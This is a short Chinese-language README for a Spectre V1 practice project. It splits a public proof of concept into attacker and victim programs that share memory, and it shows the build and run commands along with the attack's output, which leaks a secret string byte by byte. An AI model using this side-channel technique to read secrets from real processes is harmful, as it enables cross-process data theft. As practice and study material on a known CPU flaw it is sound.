# Spectre_V1_Practice
魔改[Example of using revealed "Spectre" exploit from 2 Jan 2018 (CVE-2017-5753 and CVE-2017-5715)](https://github.com/Eugnis/spectre-attack)

拆成`attack.c`和 `victim.c`,secret数组在受害者进程中开启共享内存，攻击进程通过共享内存实现攻击。

```bash
gcc -c attack.c victim.c
gcc -o attack attack.o -lrt
gcc -o victim victim.o -lrt
./victim

Putting 'Test shared memory-based attack.' in memory, address 0x7f989ad5a000
```

新窗口中运行

```bash
./attack

Getting 'Test shared memory-based attack.' in memory, address 0x7f29b0946000
Reading 32 bytes:
Reading at malicious_x = 0x29b11cb15fc0 ... Unclear: 0x54='T' score=996 (second best: 0x00='?' score=558)
Reading at malicious_x = 0x29b11cb15fc1 ... Success: 0x65='e' score=9 (second best: 0x01='?' score=2)
Reading at malicious_x = 0x29b11cb15fc2 ... Unclear: 0x73='s' score=999 (second best: 0x00='?' score=522)
Reading at malicious_x = 0x29b11cb15fc3 ... Unclear: 0x74='t' score=997 (second best: 0x00='?' score=526)
Reading at malicious_x = 0x29b11cb15fc4 ... Success: 0x20=' ' score=2 
Reading at malicious_x = 0x29b11cb15fc5 ... Success: 0x73='s' score=2 
Reading at malicious_x = 0x29b11cb15fc6 ... Success: 0x68='h' score=2 
Reading at malicious_x = 0x29b11cb15fc7 ... Success: 0x61='a' score=2 
Reading at malicious_x = 0x29b11cb15fc8 ... Success: 0x72='r' score=13 (second best: 0x00='?' score=4)
Reading at malicious_x = 0x29b11cb15fc9 ... Success: 0x65='e' score=11 (second best: 0x00='?' score=3)
Reading at malicious_x = 0x29b11cb15fca ... Success: 0x64='d' score=7 (second best: 0x00='?' score=1)
Reading at malicious_x = 0x29b11cb15fcb ... Success: 0x20=' ' score=11 (second best: 0x00='?' score=3)
Reading at malicious_x = 0x29b11cb15fcc ... Success: 0x6D='m' score=2 
Reading at malicious_x = 0x29b11cb15fcd ... Success: 0x65='e' score=2 
Reading at malicious_x = 0x29b11cb15fce ... Success: 0x6D='m' score=2 
Reading at malicious_x = 0x29b11cb15fcf ... Success: 0x6F='o' score=7 (second best: 0x00='?' score=1)
Reading at malicious_x = 0x29b11cb15fd0 ... Success: 0x72='r' score=2 
Reading at malicious_x = 0x29b11cb15fd1 ... Success: 0x79='y' score=2 
Reading at malicious_x = 0x29b11cb15fd2 ... Success: 0x2D='-' score=2 
Reading at malicious_x = 0x29b11cb15fd3 ... Success: 0x62='b' score=2 
Reading at malicious_x = 0x29b11cb15fd4 ... Success: 0x61='a' score=2 
Reading at malicious_x = 0x29b11cb15fd5 ... Success: 0x73='s' score=2 
Reading at malicious_x = 0x29b11cb15fd6 ... Success: 0x65='e' score=2 
Reading at malicious_x = 0x29b11cb15fd7 ... Success: 0x64='d' score=2 
Reading at malicious_x = 0x29b11cb15fd8 ... Success: 0x20=' ' score=2 
Reading at malicious_x = 0x29b11cb15fd9 ... Success: 0x61='a' score=2 
Reading at malicious_x = 0x29b11cb15fda ... Success: 0x74='t' score=13 (second best: 0x00='?' score=4)
Reading at malicious_x = 0x29b11cb15fdb ... Success: 0x74='t' score=2 
Reading at malicious_x = 0x29b11cb15fdc ... Success: 0x61='a' score=59 (second best: 0x00='?' score=27)
Reading at malicious_x = 0x29b11cb15fdd ... Success: 0x63='c' score=31 (second best: 0x00='?' score=13)
Reading at malicious_x = 0x29b11cb15fde ... Success: 0x6B='k' score=21 (second best: 0x00='?' score=8)
Reading at malicious_x = 0x29b11cb15fdf ... Success: 0x2E='.' score=2 
```

